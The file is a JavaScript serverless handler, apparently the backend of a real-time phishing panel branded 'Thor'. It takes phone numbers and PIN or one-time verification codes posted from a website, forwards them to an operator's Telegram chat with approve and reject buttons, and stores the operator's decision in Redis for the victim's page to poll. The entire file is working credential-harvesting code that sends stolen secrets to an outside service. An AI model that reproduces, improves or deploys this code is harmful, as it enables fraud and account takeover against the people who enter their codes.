import { Redis } from '@upstash/redis';

const redis = (() => {
  const url = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;
  if (!url || !token) {
    console.error("CRITICAL ERROR: Redis URL or Token is missing!");
    return null;
  }
  return new Redis({ url, token });
})();

export default async function handler(req, res) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    // 1. GET Request (Website Polling)
    if (req.method === 'GET') {
        try {
            const { userId } = req.query;
            if (!redis) return res.status(500).json({ error: 'Database not connected' });
            const status = await redis.get(`status_${userId}`);
            return res.status(200).json({ status: status || 'pending' });
        } catch (error) {
            console.error("GET Error:", error);
            return res.status(500).json({ error: 'Database error' });
        }
    }

    // 2. POST Request (From Website)
    if (req.method === 'POST' && req.body && req.body.action === 'send_verification') {
        console.log("--- NEW REQUEST RECEIVED FROM WEBSITE ---");
        
        if (!BOT_TOKEN) {
            console.error("ERROR: TELEGRAM_BOT_TOKEN is missing in Vercel settings!");
            return res.status(500).json({ error: 'Bot token missing' });
        }
        
        if (!ADMIN_CHAT_ID) {
            console.error("ERROR: TELEGRAM_CHAT_ID is missing in Vercel settings!");
            return res.status(500).json({ error: 'Chat ID missing' });
        }

        if (!redis) {
            console.error("ERROR: Database is not connected!");
            return res.status(500).json({ error: 'Database missing' });
        }

        try {
            const { phone, pin, userId, type } = req.body; 
            console.log(`Setting status for user ${userId} to pending...`);
            
            await redis.set(`status_${userId}`, 'pending'); 
            console.log("Database updated successfully. Preparing Telegram message...");

            const text = `# Thor - ${type.toUpperCase()} Verification\n` +
                         `${type.toUpperCase()} VERIFICATION NEEDED\n\n` +
                         `USER DETAILS:\n` +
                         `• Phone Number: ${phone}\n` +
                         `• ${type.toUpperCase()} Code: ${pin}\n` +
                         `• Username & Pass: user_${userId}\n` +
                         `• Time: ${new Date().toLocaleString()}\n\n` +
                         `Verify the ${type.toUpperCase()}:`;

            const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: text,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "✅ Correct PIN", callback_data: `approve_${userId}_${type}` }],
                            [{ text: "❌ Wrong PIN", callback_data: `reject_${userId}_${type}` }]
                        ]
                    }
                })
            });

            const tgData = await tgRes.json();
            console.log("Telegram API Response:", tgData);

            if (!tgRes.ok) {
                console.error("TELEGRAM REJECTED THE MESSAGE:", tgData);
                return res.status(500).json({ error: 'Telegram rejected message', details: tgData });
            }

            console.log("SUCCESS! Message sent to Telegram.");
            return res.status(200).json({ success: true });
            
        } catch (error) {
            console.error("FATAL SERVER ERROR:", error);
            return res.status(500).json({ error: error.message });
        }
    }

    // 3. POST Request (From Telegram Button Click)
    if (req.method === 'POST' && req.body && req.body.callback_query) {
        try {
            const { id, data, message } = req.body.callback_query;
            const [action, userId, type] = data.split('_'); 

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: id })
            });

            if (action === 'approve') {
                await redis.set(`status_${userId}`, 'approved');
                await editTelegramMessage(message.message_id, `✅ PIN APPROVED - User can proceed`);
            } else if (action === 'reject') {
                await redis.set(`status_${userId}`, 'rejected');
                await editTelegramMessage(message.message_id, `❌ WRONG ${type.toUpperCase()} - Rejected`);
            }
            return res.status(200).send('OK');
        } catch (error) {
            console.error("Telegram Callback Error:", error);
            return res.status(500).send('Error');
        }
    }
    
    return res.status(200).send('OK');
}

async function editTelegramMessage(messageId, text) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: messageId,
            reply_markup: { inline_keyboard: [[{ text: text, callback_data: "noop" }]] }
        })
    });
              }
